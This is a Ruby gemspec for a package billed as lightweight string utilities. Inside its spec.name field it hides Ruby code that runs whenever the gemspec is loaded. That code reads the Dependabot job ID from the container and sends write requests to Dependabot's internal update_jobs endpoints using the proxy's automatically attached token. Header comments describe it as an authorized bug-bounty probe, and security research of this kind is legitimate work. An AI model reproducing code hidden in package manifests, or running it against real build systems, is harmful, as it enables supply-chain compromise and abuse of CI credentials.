# frozen_string_literal: true
#
# v1.7 boundary-verification probe — captureless authorization audit.
#
# Authorization context: bug bounty research authorized by HackerOne GitHub
# program (programs/github/scope.md). Tester: mr_benty (CVP-approved). All
# probes within program-published scope; all artifacts sanitized; no third-
# party data accessed; no token egress to attacker URL (captureless design).
#
# Scope: audit whether the per-job orchestration token authorizes the four
# write endpoints documented in HYP-F011-A T0 (which already confirmed
# endpoint existence via fake-auth differential — all 4 returned 403).
#
# Captureless design: from inside the bundler-updater container, send HTTPS
# requests to dependabot-actions.githubapp.com/update_jobs/<own_jobId>/<endpoint>.
# The proxy's DependabotAPIHandler auto-attaches the per-job orchestration
# token (per dependabot/proxy@2803a0f0 internal/handlers/dependabot_api.go:42).
# Response code is observed in-container; encoded via PROBE-MARK pattern
# (sha256+length only, no body content surfaced).
#
# Outcome interpretation:
#   - 2xx with side-effect           → token authorizes endpoint (HYP-F011-A
#                                       Critical-uplift evidence for F011)
#   - 401 / 403 "token unauthorized" → token NOT authorized for this endpoint
#                                       (HYP-F011-A architectural bound;
#                                       honest negative finding)
#   - 422 / 400 "missing field X"    → token AUTHORIZED but body validation
#                                       failed (still HYP-F011-A positive —
#                                       the auth gate passed)
#
# Side-effect minimization: bodies are intentionally minimal {} to invoke
# server-side validation BEFORE any processing. close_pull_request endpoint
# excluded from this probe (too high risk of unintended PR closure on the
# own-tenant run).

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "json"
      require "digest"

      # Read own jobId from in-container job.json (Dependabot writes it there).
      job_id = nil
      begin
        jjson = File.read("/home/dependabot/dependabot-updater/job.json")
        parsed = JSON.parse(jjson)
        job_id = parsed.dig("job", "id") || parsed["id"]
      rescue
        # fall through to env fallback
      end
      job_id ||= ENV["DEPENDABOT_JOB_ID"]

      results = []
      results << "jobid-#{job_id ? job_id.to_s[0, 12] : 'nil'}"

      api_url = ENV["DEPENDABOT_API_URL"] || "https://dependabot-actions.githubapp.com"

      if job_id
        # Endpoint set: 1 GET (sanity) + 3 POST (the writes we audit).
        # close_pull_request EXCLUDED to avoid unintended state change.
        endpoints = [
          ["GET",  "details"],
          ["POST", "update_dependency_list"],
          ["POST", "update_pull_request"],
          ["POST", "create_pull_request"],
        ]

        endpoints.each_with_index do |(method, endpoint), i|
          begin
            uri = URI("#{api_url}/update_jobs/#{job_id}/#{endpoint}")
            h = Net::HTTP.new(uri.host, uri.port)
            h.use_ssl = true if uri.scheme == "https"
            h.open_timeout = 4
            h.read_timeout = 6

            req = (method == "GET") ? Net::HTTP::Get.new(uri.request_uri) : Net::HTTP::Post.new(uri.request_uri)
            if method == "POST"
              req["Content-Type"] = "application/json"
              req.body = "{}"
            end
            req["X-Probe-Mark"] = "HYP-F011-A-T2-T6-authorization-audit"

            rsp = h.request(req)
            body_len = rsp.body.to_s.length
            body_hash = Digest::SHA256.hexdigest(rsp.body.to_s[0, 512])[0, 8]
            results << "ep#{i}-#{endpoint[0, 8].gsub('_', 'x')}-#{method}-s#{rsp.code}-l#{body_len}-h#{body_hash}"
          rescue => e
            results << "ep#{i}-err-#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 12]}"
          end
        end
      end

      summary = results.join("-").gsub(/[^A-Za-z0-9-]/, "x")[0, 1800]

      begin
        File.open("/home/dependabot/HYP-F011-A-T2-T6-MARKER.txt", "w") do |f|
          f.puts "PROBE-MARK-HYP-F011-A-T2-T6-authorization-audit"
          f.puts summary
          f.puts "ts=#{Time.now.utc.to_i}"
        end
      rescue
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
